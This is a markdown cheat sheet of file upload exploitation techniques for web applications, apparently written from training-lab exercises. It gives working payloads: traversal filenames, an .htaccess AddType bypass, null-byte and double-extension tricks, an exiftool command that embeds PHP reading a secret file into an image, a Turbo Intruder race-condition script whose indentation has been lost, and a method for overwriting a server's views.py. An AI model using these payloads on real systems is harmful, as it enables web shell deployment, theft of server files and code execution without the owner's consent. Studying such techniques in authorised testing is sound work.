# File upload exploitation

## Summary
* [Change the file signature accordingly](#change-the-file-signature-accordingly)
* [Image extension file name validation](#image-extension-file-name-validation)
* [Directory traversal file upload](#directory-traversal-file-upload)
* [Extension blacklist bypass](#extension-blacklist-bypass)
* [Obfuscated file extension](#obfuscated-file-extension)
* [Polyglot web shell upload](#polyglot-web-shell-upload)
* [Web shell upload via race condition](#web-shell-upload-via-race-condition)
* [Replacing file with customized file with file upload](#replacing-file-with-customized-file-with-file-upload)

### Change the file signature accordingly
```
# jpeg file hex format - FF D8 FF E0 00 10 4A 46 49 46 00 01
# png file hex format - 89 50 4E 47 0D 0A 1A 0A
# pdf file hex format - 25 50 44 46 2D
```
### Image extension file name validation
```
# intercept post request with burp suite
# change content type to image/jpeg or image/png
```
### Directory traversal file upload
```
# intercept post request when uploading the file with burp suite
# change the filename to ..%2fwebshell.php
```
### Extension blacklist bypass
```
# intercept post request when uploading the file with burp suite
# change the filename to .htaccess
# change the content-type to text/plain
# change the content of the file to "AddType application/x-httpd-php .l33t"
# upload file with the extension of .l33t
```
### Obfuscated file extension
```
# providing multiple extension > exploit.php.jpg
# add trailing characters > exploit.php. || add whitespaces
# url encoding > exploit%2Ephp = exploit.php
# add semicolons or url-encoded null byte characters before file extension > exploit.asp;.jpg || exploit.php%00.jpg
# using multibyte unicode characters
# what happens if a server strip .php from exploit.p.phphp = exploit.php
```
### Polyglot web shell upload
```
# use exiftool to create a polyglot php/jpg file
# run "exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php"
# upload polyglot.php
```
### Web shell upload via race condition
Upload a file and intercept the request. Then, make a request for the file uploaded. Send the post request to tubo intruder.
```
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=100,)

request1 = '''
<POST REQUEST HERE>
'''

request2 = '''
<GET REQUEST HERE>
'''

# the 'gate' argument blocks the final byte of each request until openGate is invoked
engine.queue(request1, gate='race1')
for x in range(5):
engine.queue(request2, gate='race1')

# wait until every 'race1' tagged request is ready
# then send the final byte of each request
# (this method is non-blocking, just like queue)
engine.openGate('race1')

engine.complete(timeout=60)


def handleResponse(req, interesting):
table.add(req)
```
Paste the post request and get request before in the python code & run the attack

### Replacing file with customized file with file upload
```
> example.com has a file upload functionality where we can upload any file but we cant trigger any kind of that files
> assume we know the application has enabled debugger which means that the application will update its sources to any changes
> the application's config file is views.py in /app/app directory on the server
> customized the views.py and upload it, then intercept the request
> in the intercepted request, change the file name to /app/app/views.py (absolute path so that the application will not ignore it) because we want to replace the original views.py in /app/app directory on the server instead of uploading the file to /uploads directory on the server
```


